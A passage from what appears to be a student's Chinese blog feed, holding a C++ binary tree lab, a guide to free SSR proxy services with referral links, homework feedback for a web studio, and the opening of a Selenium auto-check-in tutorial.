InitQueue(Q);   <span class="comment">//初始化队列</span></span><br><span class="line">    <span class="keyword">if</span>(P)</span><br><span class="line">    &#123;</span><br><span class="line">        EnQueue(Q,P);</span><br><span class="line">        <span class="keyword">while</span>(!QueueEmpty(Q))</span><br><span class="line">        &#123;</span><br><span class="line">            DeQueue(Q,P);   <span class="comment">//出队列</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;P-&gt;data;</span><br><span class="line">            <span class="keyword">if</span>(P-&gt;lchild)</span><br><span class="line">                EnQueue(Q,P-&gt;lchild);</span><br><span class="line">            <span class="keyword">if</span>(P-&gt;rchild)</span><br><span class="line">                EnQueue(Q,P-&gt;rchild);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DestroyQueue(Q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse2</span><span class="params">(BiTree T)</span>    <span class="comment">//非递归中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqStack S;InitStack(S);</span><br><span class="line">    BiTree p=T;BiTree q=<span class="keyword">new</span> BiTNode;</span><br><span class="line">    <span class="keyword">while</span>(p||!StackEmpty(S))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            Push(S,p);</span><br><span class="line">            p=p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=GetTop(S);</span><br><span class="line">            Pop(S,q);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;q-&gt;data;</span><br><span class="line">            p=q-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> m=Depth(T-&gt;lchild);</span><br><span class="line">        <span class="keyword">int</span> n=Depth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">if</span>(m&gt;n)</span><br><span class="line">            <span class="keyword">return</span>(m+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span>(n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LeafCount</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T)          <span class="comment">//结点为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!T-&gt;lchild&amp;&amp;!T-&gt;rchild)      <span class="comment">//没有子节点了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> LeafCount(T-&gt;lchild)+LeafCount(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span> <span class="comment">//顺序栈的初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    S.base=<span class="keyword">new</span> SElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        S.top=S.base;   <span class="comment">//top初始化为base,空栈</span></span><br><span class="line">        S.stacksize=MAXSIZE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,SElemType e)</span><span class="comment">//顺序栈的入栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base==S.stacksize)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *S.top++=e;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,SElemType e)</span> <span class="comment">//删除栈顶元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    e=*--S.top;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">SElemType <span class="title">GetTop</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top!=S.base)</span><br><span class="line">        <span class="keyword">return</span> *(S.top<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span><span class="comment">//构造一个空队列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.base=<span class="keyword">new</span> QElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.front=Q.rear=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span><span class="comment">//元素入队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE==Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.base[Q.rear]=e;</span><br><span class="line">    Q.rear=(Q.rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,QElemType &amp;e)</span><span class="comment">//元素出队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    e=Q.base[Q.front];</span><br><span class="line">    Q.front=(Q.front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue Q)</span><span class="comment">//判断队列是否为空</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue &amp;Q)</span><span class="comment">//销毁队列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.rear=Q.front;</span><br><span class="line">    <span class="keyword">delete</span> Q.base;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"****by 夏日****"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----创建二叉链表 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----先序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----中序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----后序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----层序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----非递归中序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----二叉树深度"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"8-----二叉树叶子结点个数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a>输出示例</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200423170805868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实验性质：综合性实验&quot;&gt;&lt;a href=&quot;#实验性质：综合性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：综合性实验&quot;&gt;&lt;/a&gt;实验性质：综合性实验&lt;/h1&gt;&lt;h1 id=&quot;要求：&quot;&gt;&lt;a href=&quot;#要求：&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>科学上网教程</title>
    <link href="http://zssblog.top/2020/04/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B/"/>
    <id>http://zssblog.top/2020/04/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B/</id>
    <published>2020-04-22T10:24:00.000Z</published>
    <updated>2020-05-31T10:10:28.121Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>本次文章涉及的均为免费翻墙，效果肯定不如付费的。但如果不追求YouTube 4K画质足够平常用了。主要介绍ssr(目前在用)</p><h2 id="速度截图"><a href="#速度截图" class="headerlink" title="速度截图"></a>速度截图</h2><p>YouTube 4k视频速度，这个速度相当可以了，如果用过YouTube的应该知道<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200422172222546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>github下载速度测试，最快可达到2.3M/s（手机热点），一下40多M没了，有点心疼</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020042217273073.png"  alt="在这里插入图片描述"></p><p>其他的就不测了，一般这个速度完全满足大部分的需求了</p><h1 id="ssr机场"><a href="#ssr机场" class="headerlink" title="ssr机场"></a>ssr机场</h1><p>ssr主要是各种机场，一般机场有免费流量，追求速度可以包月</p><p>接下来就介绍下几个我用的机场，大家看哪个好用用哪个，一般我都用</p><p>如果提示不能注册进相应的QQ群问管理员要注册链接</p><h2 id="崽崽云"><a href="#崽崽云" class="headerlink" title="崽崽云"></a>崽崽云</h2><p>免费节点情况：</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200422173510903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>QQ群：580539633</p><p>注册链接：<a href="https://zaizaicloud.pw/auth/register?code=gpBf" target="_blank" rel="noopener">https://zaizaicloud.pw/auth/register?code=gpBf</a></p><h2 id="N95"><a href="#N95" class="headerlink" title="N95"></a>N95</h2><p>免费节点情况：不巧，这几天免费节点正在维护，就不放截图了</p><p>QQ群：717740592</p><p>注册链接：<a href="https://n95cloud.com/auth/register?code=pIsY" target="_blank" rel="noopener">https://n95cloud.com/auth/register?code=pIsY</a></p><h2 id="优云666"><a href="#优云666" class="headerlink" title="优云666"></a>优云666</h2><p>免费节点情况：太多了，没截完</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422173851471.png"  alt="image-20200422173851471"></p><p>没QQ群，TG群：<a href="https://t.me/youyun666" target="_blank" rel="noopener">https://t.me/youyun666</a></p><p>注册链接：<a href="https://youyun666.com/auth/register?code=6QxZ" target="_blank" rel="noopener">https://youyun666.com/auth/register?code=6QxZ</a></p><h2 id="XiXicats"><a href="#XiXicats" class="headerlink" title="XiXicats"></a>XiXicats</h2><p>免费节点情况：</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422174309129.png"  alt="image-20200422174309129"></p><p>没QQ群</p><p>注册链接：<a href="https://xixicats.com/auth/register?code=p4LT" target="_blank" rel="noopener">https://xixicats.com/auth/register?code=p4LT</a></p><h1 id="ssr使用教程"><a href="#ssr使用教程" class="headerlink" title="ssr使用教程"></a>ssr使用教程</h1><p>有了机场，那么我们怎么使用呢，别急，慢慢往下看</p><h2 id="客户端下载"><a href="#客户端下载" class="headerlink" title="客户端下载"></a>客户端下载</h2><blockquote><p>因为我用的linux版的客户端和Windows有点不一样，如果遇到问题下方留言</p></blockquote><p>下载 SSR 客户端，解压后以管理员身份运行 ShadowsocksR-dotnet4.0.exe。若系统提示需要安装 .NET Framework，请<a href="https://www.microsoft.com/net/download/dotnet-framework-runtime" target="_blank" rel="noopener">点此</a>访问微软官网下载安装。</p><p><a href="https://zaizaicloud.pw/client-download/ssr.7z" target="_blank" rel="noopener"> 客户端下载点我</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载好后我们去机场复制订阅链接</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422174757757.png"  alt="image-20200422174757757"></p><p>然后找到添加订阅</p><p><img src="/" class="lazyload" data-src="https://zaizaicloud.pw/theme/malio/img/tutorial/windows-ssr-2.jpg"  alt="image-20200422175212224"></p><p>右键点击小飞机，选择 “服务器订阅” &gt; “更新SSR服务器订阅”</p><p><img src="/" class="lazyload" data-src="https://zaizaicloud.pw/theme/malio/img/tutorial/windows-ssr-3.jpg"  alt="image-20200422175420070"></p><p>鼠标放到服务器出现FreeSSR-public,然后会出现很多节点选择一个即可</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422175606983.png"  alt="image-20200422175606983"></p><h2 id="寻找机场方法"><a href="#寻找机场方法" class="headerlink" title="寻找机场方法"></a>寻找机场方法</h2><p>以上机场也是我在YouTube看到的，其实这类机场还有很多，有需求的可去YouTube搜机场你就会发现一大堆人专门分享机场给你介绍</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>之所以介绍好几个机场，是为了方便切换，如果使用过程突然不能用尝试更换节点即可</p><p>介绍下系统代理模式中的PAC和全局模式的区别</p><ul><li>PAC：有一个列表，列表内的网站都揍代理，比如常见的YouTube、google。优点是节省流量，大陆内网站访问速度较快，但打开部分外国会出现不走代理点情况，还有下载软件也不会走代理的</li><li>全局模式：既然PAC部分网站不走代理，那么全局模式就可以解决。全局即电脑所有流量均走代理，即使你访问大陆网站也是走代理，这样就会导致消耗更多的流量且访问大陆网站速度慢</li><li>建议平常开PAC、需要走全局的时候再切换全局模式</li></ul><h1 id="v2ray"><a href="#v2ray" class="headerlink" title="v2ray"></a>v2ray</h1><p>v2ray和ssr类似，只不过v2ray目前比ssr稳定，也存在v2ray的机场，但是都没免费的，所以就不介绍了</p><h1 id="自行搭建"><a href="#自行搭建" class="headerlink" title="自行搭建"></a>自行搭建</h1><p>这点个人不推荐，花费较大，且速度没有保证，万一你选的服务器速度慢，那你就瞎了。如果追求速度稳定，建议购买机场包月，也不贵，一月才十来块，而且可以多人合买</p><h1 id="ssr缺点"><a href="#ssr缺点" class="headerlink" title="ssr缺点"></a>ssr缺点</h1><p>介绍完ssr大家看了速度挺激动是吧，速度那么快，那还花钱包月干啥，事实是太天真了。</p><p>免费节点虽然部分节点速度确实快，但是会出现掉线的情况，比如用着用着不能用了，这个时候就要切换节点，而且高峰期的时候网速会打折扣。</p><p>但其实要不是每天看YouTube免费的就够用了，目前我还是用的白嫖的节点</p><p>因为我最近发现YouTube还挺好，有点想合买会员的冲动，有想合买的可滴滴我</p><h1 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h1><p>对于免费机场大多采用每天签到可以领取1-5G流量的奖励，建议大家签到不然流量可能会不够用，当然如果你比较壕开个会员，那当我没说。</p><p>前几天用Python的selenium搭配linux的crontab写了个自动签到的脚本，实现每天自动签到，文章见：<a href="https://blog.csdn.net/zss192/article/details/105574863" target="_blank" rel="noopener">点我查看</a></p><p>用了几天的感受偶尔可能会签到失败，因为是外国的网站有时候打不开导致的(开代理就行)</p><p>如果大家不想每天苦逼的签到，去我csdn：<a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">点我查看</a>关注下(总不能让你白嫖吧)，私聊发我你账号密码就行</p><p>适用机场：崽崽云、N95（其他机场登录有验证所以脚本不能用）</p><p>放张脚本截图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/1.jpg"  alt="Cache_2330dc506cd4d0e1."></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>分享不易，如有帮助还望多支持下我的博客</p><p><a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">CSDN</a></p><p><a href="http://39.107.45.243/" target="_blank" rel="noopener">个人博客</a></p><p>有问题博客留言板留言或者文章下方留言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;本次文章涉及的均为免费翻墙，效果肯定不如付费的。但如果不追求YouTube 4K画质足够平常用了。主要介绍ssr(目前在用)&lt;/p&gt;
&lt;h2
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>第三次考核常见问题</title>
    <link href="http://zssblog.top/2020/04/22/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://zssblog.top/2020/04/22/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</id>
    <published>2020-04-22T06:50:00.000Z</published>
    <updated>2020-04-25T01:51:06.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件夹结构较乱"><a href="#文件夹结构较乱" class="headerlink" title="文件夹结构较乱"></a>文件夹结构较乱</h1><p>这次作业涉及多个页面所以文件夹结构至关重要，并不是说你完成了效果就行。以后会有几十个文件如果不注意这点，打开文件夹特别乱。</p><h3 id="主要问题如下"><a href="#主要问题如下" class="headerlink" title="主要问题如下"></a>主要问题如下</h3><ul><li><p>根目录放多个css文件</p></li><li><p>根目录下放多个html文件</p></li><li><p>html文件放到img文件夹下或者其他不相关文件夹下</p></li></ul><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140159969.png"  alt="image-20200422140159969"></p><p>首页默认为index.html，这个之后你们学了php就知道了</p><h1 id="文件命名不规范"><a href="#文件命名不规范" class="headerlink" title="文件命名不规范"></a>文件命名不规范</h1><p>一个文件应该能让别人通过它的名字知道这个文件是干什么的，id和class命名也是如此</p><h3 id="主要问题如下-1"><a href="#主要问题如下-1" class="headerlink" title="主要问题如下"></a>主要问题如下</h3><ul><li>文件命名为three1、three2、three3这种</li><li>文件命名含中文。以后根目录下的文件夹命名都不要含中文(容易出现乱码问题)</li></ul><h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140348689.png"  alt="image-20200422140348689"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140417192.png"  alt="image-20200422140417192"></p><h1 id="未完成要求全部内容"><a href="#未完成要求全部内容" class="headerlink" title="未完成要求全部内容"></a>未完成要求全部内容</h1><p>此次作业应含有首页、文章列表页、文章内容页、留言页面</p><p>首页应包含漂浮动画、轮播图</p><p>应做到缩放文章内容居中显示(具体效果随便打开个网页缩放看看啥效果)</p><h1 id="小建议"><a href="#小建议" class="headerlink" title="小建议"></a>小建议</h1><p>这几次作业都是前端作业，由于前端是门面，所以尽量写的美观大方，起码做到自适应不会出bug。以后项目有可能会让自己设计网页，所以在后续作业可以多留意下网页元素设计。在有能力完成所有要求后可以尝试自行设计页面。</p><p>后续作业是后端(咱们实验室学的是php)，由于后续作业是在本次作业基础上完成，所以这次作业要尽量完成的较好。不然后面别人都在写php，你还在改着你的html。</p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>通过这几次的学习，想必大家都有不小的收获，但任重道远，我们都还有很多东西要学，作为你们的学长学姐，我们也只不过是比你们早学了一年。你们现在所遇到的问题我们当时或多或少的也都遇到过。</p><p>之所以给你们一次次指出问题，是我们不想让你们以后写项目或者工作了还因为这种小问题挨吵。你们没经历过甲方乙方是不太明白这种感觉的，别人出钱咱们给他们写网页，有什么问题或哪不满意别人都是直接提出来，他们是不问你多累多辛苦的，只要你没达到他们的要求那你就等着挨吵吧。</p><p>我们所能做的就是指出你们的问题让你们尽量多学点学精点。日后遇到任何实在解决不了的或者不清楚的问题，一定要及时问，要是不好意思在qq问，博客留言也都行，只要我们看到一定都会帮你们解决的。电脑有问题或者学习上的问题都可以。</p><h3 id="小问卷"><a href="#小问卷" class="headerlink" title="小问卷"></a>小问卷</h3><p>最后做个小问卷，之前答应大家的出些生活技能上的文章，不知道大家想要哪些方面的，之前写的我也不知道你们看没看，主要有</p><ul><li>google插件推荐   （日常更方便点）</li><li>搜索资源技巧 （搜索网盘资源、视频资源）</li><li>如何翻墙 （上YouTube、较快速度下载外国软件）</li><li>谈谈项目经验 (虽然也没做过几个，但也是有点经验)</li><li>…………..</li></ul><p>下方留言或者qq私聊，达到两三个人就出文章。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件夹结构较乱&quot;&gt;&lt;a href=&quot;#文件夹结构较乱&quot; class=&quot;headerlink&quot; title=&quot;文件夹结构较乱&quot;&gt;&lt;/a&gt;文件夹结构较乱&lt;/h1&gt;&lt;p&gt;这次作业涉及多个页面所以文件夹结构至关重要，并不是说你完成了效果就行。以后会有几十个文件如果不注意这
      
    
    </summary>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/categories/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/tags/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
  </entry>
  
  <entry>
    <title>selenium搭配crontab实现自动签到</title>
    <link href="http://zssblog.top/2020/04/17/selenium%E6%90%AD%E9%85%8Dcrontab%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/"/>
    <id>http://zssblog.top/2020/04/17/selenium%E6%90%AD%E9%85%8Dcrontab%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/</id>
    <published>2020-04-17T08:45:00.000Z</published>
    <updated>2020-05-31T10:14:33.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>前几天接触到linux中的crontab可以定时完成更换壁纸、推送本地文件到github等功能。这几天想着可不可以弄个自动签到的脚本，本来用的爬虫带cookie实现登录然后签到，但是过几天cookie失效就凉凉了。偶然的机会了解到selenium可以模拟浏览器点击，于是找了找关于自动签到的文章学习下，在次记录下。</p><h1 id="selenium简介"><a href="#selenium简介" class="headerlink" title="selenium简介"></a>selenium简介</h1><p>Selenium 是一个综合性的项目，为web浏览器的自动化提供了各种工具和依赖包。他有很多功能。此次主要结合Python，功能可以理解为可以模拟一个浏览器并进行各种点击、填写账号密码等操作。</p><h1 id="放张截图"><a href="#放张截图" class="headerlink" title="放张截图"></a>放张截图</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200417161530715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><p>主要是选取到合适的元素，假装代码是一个人，你要先打开网页，然后输入账号，然后你要点击登录这样的按钮，对于代码来说它要先找到登录的按钮才能进行点击等操作。所以查找的合适精准至关重要。</p><h2 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h2><p>通过id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">'loginForm'</span>)</span><br></pre></td></tr></table></figure><p>通过name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_name(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure><p>通过Xpath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绝对定位 (页面结构轻微调整就会被破坏)</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"/html/body/form[1]"</span>)</span><br><span class="line"><span class="comment">#HTML页面中的第一个form元素</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//form[1]"</span>)</span><br><span class="line"><span class="comment">#包含 id 属性并且其值为 loginForm 的form元素</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//form[@id='loginForm']"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>对于查找而言，你可以F12选中一个元素然后右键选择Copy便有copy xpath等选项</p></blockquote><h2 id="其他要点"><a href="#其他要点" class="headerlink" 